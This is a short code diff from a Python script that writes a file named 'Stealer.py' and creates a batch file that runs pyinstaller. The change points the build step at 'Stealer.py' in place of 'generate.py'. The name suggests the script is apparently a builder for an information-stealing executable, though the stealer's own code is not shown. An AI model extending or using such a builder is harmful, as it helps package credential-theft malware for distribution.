@@ -26,5 +26,5 @@ with open("Stealer.py","w") as e:
         e.writelines(line + "\n")
 
 with open("generate.bat","w") as x:
-    x.writelines('c:\ \n set PATH=%PATH%;C:\Python27\Scripts\nstart pyinstaller -F generate.py')
+    x.writelines('c:\ \n set PATH=%PATH%;C:\Python27\Scripts\nstart pyinstaller -F Stealer.py')
 subprocess.call(['generate.bat'])
